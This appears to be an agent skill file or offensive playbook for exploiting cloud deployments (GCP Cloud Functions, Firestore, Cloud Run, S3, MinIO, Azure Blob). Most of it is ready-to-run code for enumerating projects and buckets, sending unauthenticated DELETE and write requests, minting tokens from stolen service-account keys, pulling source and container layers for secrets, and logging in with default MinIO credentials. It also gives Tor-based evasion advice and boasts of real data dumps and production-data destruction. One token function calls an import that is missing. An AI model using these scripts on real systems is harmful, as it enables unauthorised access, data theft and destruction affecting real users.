---
name: cloud-iam-deep
description: "GCP/AWS/Azure cloud exploitation -- Cloud Functions, Firestore, Cloud Run, S3, MinIO, Blob Storage, SA keys"
sources: field_ops, real_targets
report_count: 25+
---

# Cloud IAM Deep -- Cloud Functions, Storage, IAM Exploitation

## When to Use

- After finding Firebase API keys, Supabase keys, or GCP SA keys
- When a target uses serverless (Cloud Functions, Cloud Run)
- After finding S3 bucket names or MinIO instances
- One SA key can escalate to full cloud access

## Cloud Functions URL Patterns (GCP)

```
https://{REGION}-{PROJECT_ID}.cloudfunctions.net/{FUNCTION_NAME}
https://us-central1-{PROJECT_ID}.cloudfunctions.net/api/feed
```

## PROJECT_ID Discovery

```python
projects = ["empresa", "empresa-app", "empresa-prod", "empresa-dev",
            "empresa-1", "empresa-12345", "app-empresa", "admin-1a2b3"]
regions = ["us-central1", "us-east1", "southamerica-east1", "europe-west1"]

for proj in projects:
    for region in regions:
        url = f"https://{region}-{proj}.cloudfunctions.net/api/feed?limit=1"
        try:
            r = requests.get(url, timeout=5)
            if r.status_code != 404 and len(r.text) > 20:
                print(f"DONE {url} -> {r.status_code}")
        except:
            pass
```

## Testing HTTP Methods Without Auth

```python
methods = {
    "GET": requests.get,
    "POST": lambda u: requests.post(u, json={"test": "test"}),
    "PUT": lambda u: requests.put(u, json={"test": "test"}),
    "DELETE": lambda u: requests.delete(u),
}

for method_name, method_func in methods.items():
    try:
        r = method_func(url)
        if r.status_code not in [401, 403, 404, 405]:
            print(f"WARN {method_name} {url} -> {r.status_code} (ACCEPTED!)")
    except:
        pass
```

**Real-world case (CRITICAL)**: 6 Cloud Functions from fitness tech platform:
- GET without auth -- dump of 15,800+ posts, 389+ users, real student data
- DELETE without auth -- confirmed destruction of production data
- Reflected CORS on ALL 6 functions -- drive-by attack possible
- 705 PDF tokens leaked

## Source Code Buckets (gcf-sources-*)

```
gcf-sources-{PROJECT_NUMBER}-{REGION}
gcf-v2-sources-{PROJECT_NUMBER}-{REGION}
```

With SA key read permission:
```javascript
const {Storage} = require('@google-cloud/storage');
const storage = new Storage({credentials: sa});
const bucket = storage.bucket('gcf-sources-706681009423-us-central1');
const [files] = await bucket.getFiles();
for (const f of files.filter(f => f.name.endsWith('.zip'))) {
    await f.download({destination: '/tmp/' + f.name.replace(/\//g, '_')});
}
```

## Service Account Key -> GCP Token Generation

```python
import json, base64, time, requests
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding as pad
from cryptography.hazmat.backends import default_backend

def get_gcp_token(sa_key):
    """Generates a GCP access token from an SA key."""
    now = int(time.time())
    header = base64.urlsafe_b64encode(
        json.dumps({"alg":"RS256","typ":"JWT"}).encode()
    ).rstrip(b'=').decode()
    claims = {
        "iss": sa_key['client_email'],
        "scope": "https://www.googleapis.com/auth/cloud-platform",
        "aud": sa_key['token_uri'],
        "iat": now,
        "exp": now + 3600
    }
    payload = base64.urlsafe_b64encode(json.dumps(claims).encode()).rstrip(b'=').decode()
    key = load_pem_private_key(
        sa_key['private_key'].encode(), password=None, backend=default_backend()
    )
    signature = base64.urlsafe_b64encode(
        key.sign(f'{header}.{payload}'.encode(), pad.PKCS1v15(), hashes.SHA256())
    ).rstrip(b'=').decode()

    resp = requests.post(sa_key['token_uri'],
        data=f'grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion={header}.{payload}.{signature}'.encode(),
        headers={'Content-Type':'application/x-www-form-urlencoded'}, timeout=10)
    return resp.json()['access_token']

# List IAM policy (find owners/admins)
r = requests.get(
    f'https://cloudresourcemanager.googleapis.com/v1/projects/{project_id}:getIamPolicy',
    headers={'Authorization': f'Bearer {token}'}
)
for binding in r.json().get('bindings', []):
    if binding['role'] in ['roles/owner', 'roles/editor']:
        print(f"ROLE {binding['role']}: {binding['members']}")

# List Storage buckets
r = requests.get(
    f'https://storage.googleapis.com/storage/v1/b?project={project_id}',
    headers={'Authorization': f'Bearer {token}'}
)
for bucket in r.json().get('items', []):
    print(f"BUCKET {bucket['name']}")

# Test Firestore access
r = requests.get(
    f'https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents',
    headers={'Authorization': f'Bearer {token}'}
)
if r.status_code == 200:
    print("FIRESTORE ACCESSIBLE")
```

## Firebase Open SignUp

```bash
curl -s "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$API_KEY"   -H "Content-Type: application/json"   -d '{"email":"attacker@domain.com","password":"Senha123!","returnSecureToken":true}'
```

## Firestore Public Access Test

```bash
curl -s "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/users?key=$API_KEY"
curl -s "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/stores?key=$API_KEY"

# Test WRITE
curl -X PATCH "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/stores/ID?updateMask.fieldPaths=fieldName"   -H "Content-Type: application/json"   -d '{"fields":{"fieldName":{"stringValue":"test"}}}'
```

**Real-world case (CRITICAL)**: Delivery platform -- 3 Firebase projects:
- 4,000 stores (CNPJ, GPS, phone, menu) + PATCH write confirmed
- 204K WhatsApp conversations, 173K customer phone numbers
- 1K+ public MP3 audio files in Storage

## Cloud Run Service Listing

```javascript
const {v2} = require('@google-cloud/run');
const client = new v2.ServicesClient({credentials: sa});
const [services] = await client.listServices({
    parent: 'projects/' + projectId + '/locations/us-central1'
});
for (const svc of services) {
    console.log(svc.name, svc.uri, svc.ingress);
}
```

## Artifact Registry Image Download and Analysis

```python
# List repositories
r = requests.get(
    f'https://artifactregistry.googleapis.com/v1/projects/{project}/locations/{region}/repositories',
    headers={'Authorization': f'Bearer {token}'}
)

# Download specific image manifest
digest = "sha256:XXXXX"
r = requests.get(
    f'https://{region}-docker.pkg.dev/v2/{project}/{repo}/{image}/manifests/{digest}',
    headers={'Authorization': f'Bearer {token}',
             'Accept': 'application/vnd.docker.distribution.manifest.v2+json'}
)

# Download layers
for i, layer in enumerate(r.json().get('layers', [])):
    r2 = requests.get(
        f'https://{region}-docker.pkg.dev/v2/{project}/{repo}/{image}/blobs/{layer["digest"]}',
        headers={'Authorization': f'Bearer {token}'}
    )
    with open(f'/tmp/layer_{i}.tar.gz', 'wb') as f:
        f.write(r2.content)

# Extract and search for secrets
# tar -xzf layer.tar.gz
# grep -r "MIGRATION_TOKEN|APP_KEY|DB_PASSWORD" .
```

## S3 Bucket Enumeration and Upload Testing

```bash
# Test if bucket is public
curl -s "http://bucket-name.s3.amazonaws.com/"

# Upload (if writable)
curl -X PUT "http://bucket-name.s3.amazonaws.com/test.txt"   -H "Content-Type: text/plain" -d "pwned"

# Test common bucket names
for b in "target" "target-prod" "target-dev" "target-images" "target-uploads"          "target-backup" "target-media" "download.target.com" "static.target.com"; do
  r=$(curl -sk -o /dev/null -w "%{http_code}" "https://$b.s3.amazonaws.com/" 2>/dev/null)
  [ "$r" != "404" ] && echo "$b -> HTTP $r"
done
```

## MinIO Health Check and Admin API

```bash
# Health check
curl -sI "http://host:9000/minio/health/live"

# Admin API
curl -s "http://host:9000/minio/admin/v3/info"

# Web console login (port 9001)
curl -X POST "http://host:9001/api/v1/login"   -H "Content-Type: application/json"   -d '{"accessKey":"minioadmin","secretKey":"minioadmin"}'

# List bucket objects
curl -s "http://host:9000/bucket-name?list-type=2"

# Upload
curl -X PUT "http://host:9000/bucket-name/file.html"   -H "Content-Type: text/html; charset=utf-8" -d "<h1>Pwned</h1>"
```

## Azure Blob Storage Testing

```bash
# URL pattern: https://{storage_account}.blob.core.windows.net/{container}
curl -s "https://storageaccount.blob.core.windows.net/container?restype=container&comp=list"
```

## Pitfalls

| Issue | Solution |
|-------|----------|
| SA key revoked | Monitor usage, rotate keys carefully |
| Rate limiting | Space requests, rotate IP via Tor |
| False positive project IDs | Verify with simple GET before deep testing |
| Cloud Run ingress=internal | Only accessible from VPC; need VPN |

## Verification

```bash
# Verify SA key works
python3 -c "from google.oauth2 import service_account; creds = service_account.Credentials.from_service_account_file('sa.json'); print(creds.valid)"
# Verify Cloud Function
curl -s "https://us-central1-PROJECT.cloudfunctions.net/FUNC" | head -5
```
